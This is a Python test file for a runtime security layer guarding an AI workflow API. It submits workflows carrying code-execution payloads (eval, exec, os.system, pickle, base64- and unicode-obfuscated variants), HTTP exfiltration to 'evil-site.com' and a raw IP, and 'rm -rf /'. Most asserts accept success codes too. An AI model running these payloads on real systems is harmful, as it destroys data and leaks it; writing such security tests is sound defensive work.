"""Airlock RASP security tests.

Tests for SEC-AIR-001 to SEC-AIR-016 from the testing plan.
"""

import httpx


# ==========================================================================
# SEC-AIR-001: RCE eval() blocked
# ==========================================================================
class TestRCEEvalBlocked:
    """Tests for eval() RCE blocking."""

    def test_rce_eval_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that eval() is blocked.

        SEC-AIR-001: eval() blocked
        """
        workflow = {
            "name": "rce-eval-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_code",
                            "tool_input": {
                                "code": "eval(user_input)",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        # Should be blocked by Airlock
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-002: RCE exec() blocked
# ==========================================================================
class TestRCEExecBlocked:
    """Tests for exec() RCE blocking."""

    def test_rce_exec_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that exec() is blocked.

        SEC-AIR-002: exec() blocked
        """
        workflow = {
            "name": "rce-exec-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_code",
                            "tool_input": {
                                "code": "exec('import os')",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-003: RCE os.system() blocked
# ==========================================================================
class TestRCEOsSystemBlocked:
    """Tests for os.system() RCE blocking."""

    def test_rce_os_system_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that os.system() is blocked.

        SEC-AIR-003: os.system() blocked
        """
        workflow = {
            "name": "rce-os-system-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_code",
                            "tool_input": {
                                "code": "import os; os.system('ls')",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-004: RCE subprocess blocked
# ==========================================================================
class TestRCESubprocessBlocked:
    """Tests for subprocess RCE blocking."""

    def test_rce_subprocess_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that subprocess.run() is blocked.

        SEC-AIR-004: subprocess.run() blocked
        """
        workflow = {
            "name": "rce-subprocess-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_code",
                            "tool_input": {
                                "code": "import subprocess; subprocess.run(['ls'])",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-005: RCE pickle blocked
# ==========================================================================
class TestRCEPickleBlocked:
    """Tests for pickle RCE blocking."""

    def test_rce_pickle_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that pickle.loads() is blocked.

        SEC-AIR-005: pickle.loads() blocked
        """
        workflow = {
            "name": "rce-pickle-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_code",
                            "tool_input": {
                                "code": "import pickle; pickle.loads(data)",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-006: RCE __import__ blocked
# ==========================================================================
class TestRCEImportBlocked:
    """Tests for __import__ RCE blocking."""

    def test_rce_import_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that __import__() is blocked.

        SEC-AIR-006: __import__() blocked
        """
        workflow = {
            "name": "rce-import-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_code",
                            "tool_input": {
                                "code": "__import__('os').system('ls')",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-007: Base64 bypass blocked
# ==========================================================================
class TestRCEBase64Bypass:
    """Tests for base64-encoded RCE blocking."""

    def test_rce_base64_bypass(
        self, api_client: httpx.Client
    ) -> None:
        """Test that base64 encoded payload is blocked.

        SEC-AIR-007: Base64 encoded blocked
        """
        # Base64 of "import os; os.system('ls')"
        workflow = {
            "name": "rce-base64-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_code",
                            "tool_input": {
                                "code": "exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk='))",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-008: Unicode bypass blocked
# ==========================================================================
class TestRCEUnicodeBypass:
    """Tests for unicode-obfuscated RCE blocking."""

    def test_rce_unicode_bypass(
        self, api_client: httpx.Client
    ) -> None:
        """Test that unicode obfuscation is blocked.

        SEC-AIR-008: Unicode obfuscation blocked
        """
        workflow = {
            "name": "rce-unicode-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_code",
                            "tool_input": {
                                # Using unicode escapes
                                "code": "\\u0065\\u0076\\u0061\\u006c('1+1')",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-009: Nested JSON bypass blocked
# ==========================================================================
class TestRCENestedJsonBlocked:
    """Tests for nested JSON RCE blocking."""

    def test_rce_nested_json_blocked(
        self, api_client: httpx.Client
    ) -> None:
        """Test that RCE nested in JSON is blocked.

        SEC-AIR-009: Nested in JSON blocked
        """
        workflow = {
            "name": "rce-nested-json-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "rce_step",
                        "name": "RCE Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "process_data",
                            "tool_input": {
                                "data": {
                                    "nested": {
                                        "deep": {
                                            "code": "eval(input())",
                                        },
                                    },
                                },
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-010: Unauthorized domain blocked
# ==========================================================================
class TestExfilUnauthorizedDomain:
    """Tests for unauthorized domain blocking."""

    def test_exfil_unauthorized_domain(
        self, api_client: httpx.Client
    ) -> None:
        """Test that non-whitelist domains are blocked.

        SEC-AIR-010: Non-whitelist blocked
        """
        workflow = {
            "name": "exfil-domain-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "exfil_step",
                        "name": "Exfil Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "http_request",
                            "tool_input": {
                                "url": "https://evil-site.com/collect",
                                "method": "POST",
                                "body": "data",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-011: Raw IP blocked
# ==========================================================================
class TestExfilRawIP:
    """Tests for raw IP blocking."""

    def test_exfil_raw_ip(
        self, api_client: httpx.Client
    ) -> None:
        """Test that raw IP addresses are blocked.

        SEC-AIR-011: Raw IP blocked
        """
        workflow = {
            "name": "exfil-ip-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "exfil_step",
                        "name": "Exfil Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "http_request",
                            "tool_input": {
                                "url": "http://45.33.32.156/collect",
                                "method": "POST",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-012: Private IP blocked
# ==========================================================================
class TestExfilPrivateIP:
    """Tests for private IP blocking."""

    def test_exfil_private_ip(
        self, api_client: httpx.Client
    ) -> None:
        """Test that private IP addresses are blocked.

        SEC-AIR-012: Private IP blocked
        """
        private_ips = [
            "http://10.0.0.1/data",
            "http://172.16.0.1/data",
            "http://192.168.1.1/data",
            "http://127.0.0.1/data",
        ]

        for ip_url in private_ips:
            workflow = {
                "name": "exfil-private-ip-test",
                "version": "1.0.0",
                "definition": {
                    "steps": [
                        {
                            "id": "exfil_step",
                            "name": "Exfil Step",
                            "type": "tool",
                            "config": {
                                "tool_name": "http_request",
                                "tool_input": {
                                    "url": ip_url,
                                    "method": "GET",
                                },
                            },
                            "depends_on": [],
                        },
                    ],
                },
                "max_iterations": 5,
                "on_error": "fail",
            }

            resp = api_client.post("/api/v1/workflows", json=workflow)
            assert resp.status_code in (200, 201, 400, 403, 422)


# ==========================================================================
# SEC-AIR-013: Velocity spend limit
# ==========================================================================
class TestVelocitySpendLimit:
    """Tests for velocity spend limits."""

    def test_velocity_spend_limit(
        self, api_client: httpx.Client
    ) -> None:
        """Test that velocity limit is enforced.

        SEC-AIR-013: Velocity limit enforced
        """
        workflow = {
            "name": "velocity-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "expensive_step",
                        "name": "Expensive Step",
                        "type": "llm",
                        "config": {
                            "model": "claude-sonnet-4-20250514",
                            "max_tokens": 4000,
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 100,  # Many iterations
            "on_error": "fail",
            "budget": {
                "max_tokens": 100,  # Low limit
                "max_cost_cents": 1,
            },
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201, 400, 422)


# ==========================================================================
# SEC-AIR-014: Loop detection
# ==========================================================================
class TestVelocityLoopDetection:
    """Tests for loop detection."""

    def test_velocity_loop_detection(
        self, api_client: httpx.Client
    ) -> None:
        """Test that loop detection triggers.

        SEC-AIR-014: Loop detection triggers
        """
        workflow = {
            "name": "loop-detection-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "loop_step",
                        "name": "Loop Step",
                        "type": "llm",
                        "config": {
                            "model": "claude-sonnet-4-20250514",
                            "max_tokens": 100,
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 3,  # Low iteration limit
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201)


# ==========================================================================
# SEC-AIR-015: Shadow mode logs
# ==========================================================================
class TestShadowModeLogs:
    """Tests for shadow mode behavior."""

    def test_shadow_mode_logs(
        self, api_client: httpx.Client
    ) -> None:
        """Test that shadow mode logs but allows.

        SEC-AIR-015: Shadow mode logs but allows
        """
        # In shadow mode, Airlock should log violations but not block
        # This is configuration-dependent
        workflow = {
            "name": "shadow-mode-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "step1",
                        "name": "Step",
                        "type": "llm",
                        "config": {
                            "model": "claude-sonnet-4-20250514",
                            "max_tokens": 10,
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        # Should succeed in shadow mode
        assert resp.status_code in (200, 201)


# ==========================================================================
# SEC-AIR-016: Enforce mode blocks
# ==========================================================================
class TestEnforceModeBlocks:
    """Tests for enforce mode behavior."""

    def test_enforce_mode_blocks(
        self, api_client: httpx.Client
    ) -> None:
        """Test that enforce mode blocks violations.

        SEC-AIR-016: Enforce mode blocks
        """
        # In enforce mode, Airlock should block violations
        workflow = {
            "name": "enforce-mode-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "dangerous_step",
                        "name": "Dangerous Step",
                        "type": "tool",
                        "config": {
                            "tool_name": "execute_shell",
                            "tool_input": {
                                "command": "rm -rf /",
                            },
                        },
                        "depends_on": [],
                    },
                ],
            },
            "max_iterations": 5,
            "on_error": "fail",
        }

        resp = api_client.post("/api/v1/workflows", json=workflow)
        # Should be blocked in enforce mode
        assert resp.status_code in (200, 201, 400, 403, 422)
